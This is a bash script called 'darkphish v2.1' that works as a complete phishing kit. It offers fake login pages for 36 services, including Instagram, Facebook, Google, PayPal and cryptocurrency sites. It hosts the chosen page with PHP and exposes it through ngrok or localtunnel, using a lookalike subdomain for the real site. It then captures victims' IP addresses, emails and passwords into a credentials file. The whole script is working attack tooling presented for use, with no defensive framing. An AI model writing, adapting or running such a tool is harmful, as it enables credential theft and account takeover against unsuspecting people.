#!/bin/bash
# darkphish v2.1
# color
# Reset
clear='\033[0m'       # Text Reset

# Regular Colors
Black='\033[0;30m'        # Black
Red='\033[0;31m'          # Red
Green='\033[0;32m'        # Green
Yellow='\033[0;33m'       # Yellow
Blue='\033[0;34m'         # Blue
Purple='\033[0;35m'       # Purple
Cyan='\033[0;36m'         # Cyan
White='\033[0;37m'        # White

# Bold
BBlack='\033[1;30m'       # Black
BRed='\033[1;31m'         # Red
BGreen='\033[1;32m'       # Green
BYellow='\033[1;33m'      # Yellow
BBlue='\033[1;34m'        # Blue
BPurple='\033[1;35m'      # Purple
BCyan='\033[1;36m'        # Cyan
BWhite='\033[1;37m'       # White

# Underline
UBlack='\033[4;30m'       # Black
URed='\033[4;31m'         # Red
UGreen='\033[4;32m'       # Green
UYellow='\033[4;33m'      # Yellow
UBlue='\033[4;34m'        # Blue
UPurple='\033[4;35m'      # Purple
UCyan='\033[4;36m'        # Cyan
UWhite='\033[4;37m'       # White


# Check if root
if [ "$EUID" -ne 0 ]
  then
      printf "${Red}Opps! ${BGreen}'sudo' ${Red}Please!\n"
  exit
fi
trap 'printf "\n";stop;exit 1' 2

stop() {

printf "${Green}[${BRed}R${Green}]${BGreen} Re-Run the script\n"
printf "${Green}[${BRed}X${Green}]${BGreen} Exit\n"
read -p "Option: " guard

if [[ $guard == R || $guard == r ]]; then
sleep 1
killall -2 php > /dev/null 2>&1
killall -2 lt > /dev/null 2>&1
killall -2 xterm > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
killall ssh > /dev/null 2>&1
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
sleep 0.5
./hackerhook.sh

elif [[ $guard == X || $guard == x ]]; then
sleep 2
stop1

else
stop1
fi

}

stop1() {

checknode=$(ps aux | grep -o "node" | head -n1)
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checknode == *'node'* ]]; then
pkill -f -2 node > /dev/null 2>&1
killall -2 node > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

}

dependencies() {

command -v php > /dev/null 2>&1 || { echo >&2 "${Red}I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "${Red}I require wget but it's not installed. Install it. Aborting."; exit 1; }
command -v unzip > /dev/null 2>&1 || { echo >&2 "${Red}I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "${Red}I require curl but it's not installed. Install it. Aborting."; exit 1; }
command -v lt > /dev/null 2>&1 || { echo >&2 "${Red}I require localtunnel but it's not installed. Install it. Aborting."; exit 1; }
command -v ngrok > /dev/null 2>&1 || { echo >&2 "${Red}I require ngrok but it's not installed. Install it. Aborting."; exit 1; }

}

banner() {
clear
sleep 1
printf "${BRed}██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗${BWhite}       ${BBlack}██╗  ██╗ ██████╗  ██████╗ ██╗  ██╗\n"
printf "${BRed}██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗${BWhite}      ${BBlack}██║  ██║██╔═══██╗██╔═══██╗██║ ██╔╝\n"
printf "${BRed}███████║███████║██║     █████╔╝ █████╗  ██████╔╝${BWhite}█████╗${BBlack}███████║██║   ██║██║   ██║█████╔╝ \n"
printf "${BRed}██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗${BWhite}╚════╝${BBlack}██╔══██║██║   ██║██║   ██║██╔═██╗ \n"
printf "${BRed}██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║${BWhite}      ${BBlack}██║  ██║╚██████╔╝╚██████╔╝██║  ██╗\n"
printf "${BRed}╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝${BWhite}      ${BBlack}╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝\n"
printf "=========================================================================================\n"
printf "                                                                          ${White}by: ${BGreen}John${BRed}Smith\n"
echo ""

}

banner2() {
clear
sleep 1
printf "${BRed} _   _            _            ${BWhite}       ${BGreen} _   _             _     \n"
printf "${BRed}| | | |          | |           ${BWhite}       ${BGreen}| | | |           | |    \n"
printf "${BRed}| |_| | __ _  ___| | _____ _ __${BWhite} ______${BGreen}| |_| | ___   ___ | | __ \n"
printf "${BRed}|  _  |/ _' |/ __| |/ / _ \ '__${BWhite}|______${BGreen}|  _  |/ _ \ / _ \| |/ / \n"
printf "${BRed}| | | | (_| | (__|   <  __/ |  ${BWhite}       ${BGreen}| | | | (_) | (_) |   <  \n"
printf "${BRed}\_| |_/\__,_|\___|_|\_\___|_|  ${BWhite}       ${BGreen}\_| |_/\___/ \___/|_|\_\ \n"
printf "_________________________________________________________________\n"
printf "                                                  ${White}by: ${BGreen}John${BRed}Smith\n"
}

menu() {
printf "${Red}[${White}01${Red}]${BGreen} -Instagram     ${Red}[${White}11${Red}]${BGreen} -Steam              ${Red}[${White}21${Red}]${BGreen} -Verizon       ${Red}[${White}31${Red}]${BGreen} -Yandex\n"
printf "${Red}[${White}02${Red}]${BGreen} -Facebook      ${Red}[${White}12${Red}]${BGreen} -Yahoo              ${Red}[${White}22${Red}]${BGreen} -DropBox       ${Red}[${White}32${Red}]${BGreen} -devianART\n"
printf "${Red}[${White}03${Red}]${BGreen} -Snapchat      ${Red}[${White}13${Red}]${BGreen} -Linkedin           ${Red}[${White}23${Red}]${BGreen} -Adove ID      ${Red}[${White}33${Red}]${BGreen} -Dreamland (added)\n"
printf "${Red}[${White}04${Red}]${BGreen} -Twitter       ${Red}[${White}14${Red}]${BGreen} -ProtonMail         ${Red}[${White}24${Red}]${BGreen} -Shopify       ${Red}[${White}34${Red}]${BGreen} -Genyo (Added)\n"
printf "${Red}[${White}05${Red}]${BGreen} -Github        ${Red}[${White}15${Red}]${BGreen} -WordPress          ${Red}[${White}25${Red}]${BGreen} -Messenger     ${Red}[${White}35${Red}]${BGreen} -Lazada (Added)\n"
printf "${Red}[${White}06${Red}]${BGreen} -Google        ${Red}[${White}16${Red}]${BGreen} -Microsoft          ${Red}[${White}26${Red}]${BGreen} -GitLab        ${Red}[${White}36${Red}]${BGreen} -Shopee (Added)\n"
printf "${Red}[${White}07${Red}]${BGreen} -Spotify       ${Red}[${White}17${Red}]${BGreen} -IGFollowers        ${Red}[${White}27${Red}]${BGreen} -Twitch        ${Red}[${White}X${Red}]${BRed}  -Exit${Red}\n"
printf "${Red}[${White}08${Red}]${BGreen} -Netflix       ${Red}[${White}18${Red}]${BGreen} -eBay               ${Red}[${White}28${Red}]${BGreen} -MySpace       \n"
printf "${Red}[${White}09${Red}]${BGreen} -Paypal        ${Red}[${White}19${Red}]${BGreen} -Pinterest          ${Red}[${White}29${Red}]${BGreen} -Badoo         \n"
printf "${Red}[${White}10${Red}]${BGreen} -Origin        ${Red}[${White}20${Red}]${BGreen} -CryptoCurrency     ${Red}[${White}30${Red}]${BGreen} -VK            \n"
printf "${Green}"
echo ""
read -p "Option: " option


if [[ $option == 1 || $option == 01 ]]; then
site="instagram"
server

elif [[ $option == 2 || $option == 02 ]]; then
site="facebook"
server
elif [[ $option == 3 || $option == 03 ]]; then
site="snapchat"
server
elif [[ $option == 4 || $option == 04 ]]; then
site="twitter"
server
elif [[ $option == 5 || $option == 05 ]]; then
site="github"
server
elif [[ $option == 6 || $option == 06 ]]; then
site="google"
server

elif [[ $option == 7 || $option == 07 ]]; then
site="spotify"
server

elif [[ $option == 8 || $option == 08 ]]; then
site="netflix"
server

elif [[ $option == 9 || $option == 09 ]]; then
site="paypal"
server

elif [[ $option == 10 ]]; then
site="origin"
server

elif [[ $option == 11 ]]; then
site="steam"
server

elif [[ $option == 12 ]]; then
site="yahoo"
server

elif [[ $option == 13 ]]; then
site="linkedin"
server

elif [[ $option == 14 ]]; then
site="protonmail"
server

elif [[ $option == 15 ]]; then
site="wordpress"
server

elif [[ $option == 16 ]]; then
site="microsoft"
server

elif [[ $option == 17 ]]; then
site="instafollowers"
server

elif [[ $option == 18 ]]; then
site="shopping"
server

elif [[ $option == 19 ]]; then
site="pinterest"
server

elif [[ $option == 20 ]]; then
site="cryptocurrency"
server

elif [[ $option == 21 ]]; then
site="verizon"
server

elif [[ $option == 22 ]]; then
site="dropbox"
server

elif [[ $option == 23 ]]; then
site="adobe"
server

elif [[ $option == 24 ]]; then
site="shopify"
server

elif [[ $option == 25 ]]; then
site="messenger"
server

elif [[ $option == 26 ]]; then
site="gitlab"
server

elif [[ $option == 27 ]]; then
site="twitch"
server

elif [[ $option == 28 ]]; then
site="myspace"
server

elif [[ $option == 29 ]]; then
site="badoo"
server

elif [[ $option == 30 ]]; then
site="vk"
server

elif [[ $option == 31 ]]; then
site="yandex"
server

elif [[ $option == 32 ]]; then
site="devianart"
server

elif [[ $option == 33 ]]; then
site="dreamland"
server

elif [[ $option == 34 ]]; then
site="genyo"
server

elif [[ $option == 35 ]]; then
site="lazada"
server

elif [[ $option == 36 ]]; then
site="shopee"
server

elif [[ $option == x || $option == X ]]; then
exit 1

else
printf "${BRed}[!] Invalid option!${clear}\n"
sleep 1
clear
banner
menu
fi
}

server1() {
banner2
if [[ -e webpage/$site/ip.txt ]]; then
rm -rf webpage/$site/ip.txt

fi
if [[ -e webpage/$site/usernames.txt ]]; then
rm -rf webpage/$site/usernames.txt

fi


printf "${Yellow}Starting ${BGreen}PHP ${Green}server\n"
cd webpage/$site && xterm -geometry 90x26+1000 -T "PHP server" -hold -e "php -S 127.0.0.1:3333" > /dev/null 2>&1 & 
sleep 5
printf "${BGreen}OK.${clear}\n"
printf "${Yellow}Starting ${BGreen}NGROK ${Green}server\n"
xterm -T "NGROK server" -geometry 90x26+1000+1000 -hold -e "/usr/local/bin/ngrok http 3333" > /dev/null 2>&1 &
sleep 10
printf "${BGreen}OK.${clear}\n\n"
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "${BYellow}Your Domain is:${BGreen} %s\e[0m\n" $link
printf "\n"
sleep 2
xterm -T 'Data base' -geometry 90x26+0+0 -hold -e 'tail -f webpage/credentials.txt' > /dev/null 2>&1 &
sleep 1

checkfound

}

server2() {
banner2
if [[ -e webpage/$site/ip.txt ]]; then
rm -rf webpage/$site/ip.txt

fi
if [[ -e webpage/$site/usernames.txt ]]; then
rm -rf webpage/$site/usernames.txt

fi

printf "${Yellow}Starting ${BGreen}PHP ${Green}server\n"
cd webpage/$site && xterm -geometry 90x26+1000 -hold -T "PHP server" -e "php -S 127.0.0.1:443" > /dev/null 2>&1 &
sleep 5
printf "${BGreen}OK.${clear}\n"
printf "${Yellow}Starting ${BGreen}LocalTunnel ${Green}server\n"
xterm -hold -geometry 90x26+1000+1000 -T "LocalTunnel server" -e "lt --port 443 --subdomain wmw-$site-com" > /dev/null 2>&1 &
sleep 10
printf "${BGreen}OK.${clear}\n\n"
printf "${BYellow}Your URL name is: ${BGreen}https://wmw-$site-com.loca.lt\n"
printf "\n"
sleep 2
xterm -T 'Data base' -geometry 90x26+0+0 -hold -e 'tail -f webpage/credentials.txt' > /dev/null 2>&1 &
sleep 1

checkfound
#===============================================
}

server() {
printf "${Red}[8${Red}]${White}Choose your host server\n"
printf "${Red}[${Blue}N${Red}]${Green} NGROK server ${BYellow}(${BGreen}Recomended${BYellow})\n"
printf "${Red}[${Blue}L${Red}]${Green} Local Tunnel server ${BYellow}(${BRed}Sometimes Doesnt Work Well${BYellow})\n"
echo ""
read -p "Server: " host

if [[ $host == N || $host == n ]]; then
sleep 1
server1
elif [[ $host == L || $host == l ]]; then
sleep 1
server2
fi
}

catch_cred() {
account=$(grep -o 'Account:.*' webpage/$site/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' webpage/$site/usernames.txt | cut -d ":" -f2)
printf "${BGreen}Got the Email: ${White}%s\n\e[0m" $account
printf "${BGreen}Got the Password: ${White}%s\n\e[0m" $password
printf "Website: $site \n\n" >> webpage/credentials.txt
cat webpage/$site/ip.txt | grep IP >> webpage/credentials.txt
cat webpage/$site/usernames.txt >> webpage/credentials.txt
echo "==================================" >> webpage/credentials.txt
printf "${UGreen}Saved: ${White}webpage/credentials.txt\e[0m\n"
printf "\n"
printf "${BYellow}Warning...\n${BRed}About to Close!\n"
sleep 20
killall -2 php > /dev/null 2>&1
killall -2 lt > /dev/null 2>&1
killall -2 xterm > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
killall ssh > /dev/null 2>&1
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
printf "${BGreen}Done!"
exit 1

}

getcredentials() {
printf "${Yellow}Waiting credentials ...\e[0m\n"
while [ true ]; do


if [[ -e "webpage/$site/usernames.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
catch_cred

fi
sleep 1
done 


}

catch_ip() {

getcredentials

}

checkfound() {

printf "\n"
printf "${BRed}Waiting for Possible Credentials ...\n"
while [ true ]; do

if [[ -e "webpage/$site/ip.txt" ]]; then
printf "${Green}IP Found!\n"
catch_ip
rm -rf webpage/$site/ip.txt
fi
sleep 0.5
if [[ -e "webpage/$site/usernames.txt" ]]; then
printf "${Green}Credentials Found!\n"
catch_cred
rm -rf webpage/$site/usernames.txt
fi
sleep 0.5
done 

}
banner
dependencies
menu
